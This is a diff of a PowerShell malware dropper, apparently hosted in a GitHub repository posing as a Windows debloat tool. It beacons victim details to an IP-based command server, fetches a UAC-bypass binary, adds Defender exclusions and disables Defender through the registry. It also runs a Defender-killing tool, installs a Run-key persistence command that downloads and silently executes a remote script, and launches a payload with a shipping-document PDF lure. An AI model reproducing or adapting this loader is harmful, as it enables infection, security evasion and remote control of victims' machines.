@@ -2,8 +2,8 @@ $ProgressPreference='SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
 [Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
 
-$gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers'
-$srv='https://signindat.com'
+$srv='https://193.26.115.196'
+$gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main'
 $sources=@($srv,$gh)
 
 $logPath="$env:TEMP\wmisrv.log"
@@ -22,11 +22,21 @@ function _cb($stage,$status,$detail){
         $wc=New-Object Net.WebClient
         $wc.Headers.Add('Content-Type','application/json')
         $wc.UploadString("$srv/cb.php",'POST',$body)|Out-Null
-    }catch{}
+    }catch{
+        _log "CB: $stage err: $($_.Exception.Message)"
+    }
 }
 
 _log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost"
 _cb 'S0' 'ok' "pid=$pid, u=$env:USERNAME, h=$cbHost"
+
+# DNS / reachability check
+try{
+    $null=[System.Net.Dns]::GetHostAddresses('193.26.115.196')
+    _log "S0: ip ok"
+}catch{
+    _log "S0: ip fail: $($_.Exception.Message)"
+}
 
 try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
 _log "S1: a=$cbIsAdmin"
@@ -40,9 +50,11 @@ function _dl($n){
             $d=$wc.DownloadData("$src/$n")
             _log "DL: $n $($d.Length)"
             return ,$d
-        }catch{}
+        }catch{
+            _log "DL: $n fail from $src"
+        }
     }
-    _log "DL: $n fail"
+    _log "DL: $n fail all sources"
     return $null
 }
 
@@ -97,14 +109,20 @@ function _runWait($n,$a,$s,$l,$sec){
     }
 }
 
+# === ELEVATION: one silent attempt via CMSTPLUA ===
 if(-not $cbIsAdmin){
     _run 'ElevatorShellCode.exe' 'S1' 'elev' | Out-Null
-    Start-Sleep 8
+    Start-Sleep 15
     try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
     _log "S1: a=$cbIsAdmin"
-    if($cbIsAdmin){_cb 'S1' 'ok' 'elevation ok'}else{_cb 'S1' 'warn' 'elevation fail'}
+    if($cbIsAdmin){
+        _cb 'S1' 'ok' 'elevation ok'
+    }else{
+        _cb 'S1' 'warn' 'elevation fail, continuing as user'
+    }
 }
 
+# === DEFENDER: exclusions + disable (admin only) ===
 if($cbIsAdmin){
     try{
         $mp='Add-MpPreference'
@@ -115,8 +133,8 @@ if($cbIsAdmin){
         & $mp -ExclusionProcess 'svchost.exe' -ErrorAction SilentlyContinue | Out-Null
         & $mp -ExclusionProcess 'msupdate.exe' -ErrorAction SilentlyContinue | Out-Null
         & $mp -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue | Out-Null
+        & $mp -ExclusionProcess 'windefctl.exe' -ErrorAction SilentlyContinue | Out-Null
     }catch{}
-
     try{
         $dp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
         if(-not(Test-Path $dp)){New-Item -Path $dp -Force|Out-Null}
@@ -129,17 +147,17 @@ if($cbIsAdmin){
         Set-ItemProperty -Path $rtp -Name 'DisableOnAccessProtection' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
         Set-ItemProperty -Path $rtp -Name 'DisableScanOnRealtimeEnable' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue | Out-Null
         _log "S2: reg ok"
+        _cb 'S2' 'ok' 'defender registry disabled'
     }catch{}
-
-    _runWait 'windefctl.exe' 'kill' 'S2' 'defkill' 18 | Out-Null
-    _cb 'S2' 'ok' 'defender killed'
-}else{
-    _cb 'S2' 'skip' 'no admin'
 }
 
-# cleanup windefctl binary
+# === DEFENDER KILL: always run windefctl, self-elevates internally ===
+_log "S2: windefctl exec (admin=$cbIsAdmin)"
+_runWait 'windefctl.exe' 'kill' 'S2' 'defkill' 18 | Out-Null
+_cb 'S2' 'ok' 'defkill attempted'
 Remove-Item "$env:TEMP\windefctl.exe" -Force -ErrorAction SilentlyContinue | Out-Null
 
+# === PERSISTENCE ===
 $persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspuls.ps1 %TEMP%\\u.ps1 && powershell -w hidden -NoP -file %TEMP%\\u.ps1"
 try{
     $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
@@ -172,6 +190,7 @@ if($cbIsAdmin){
 
 _cb 'S3' 'ok' 'persist ok'
 
+# === PAYLOAD ===
 _run 'PatchPulsaar.exe' 'S5' 'payload' | Out-Null
 
 $pdf='Rate_Confirmation_LD-2026-0847.pdf'
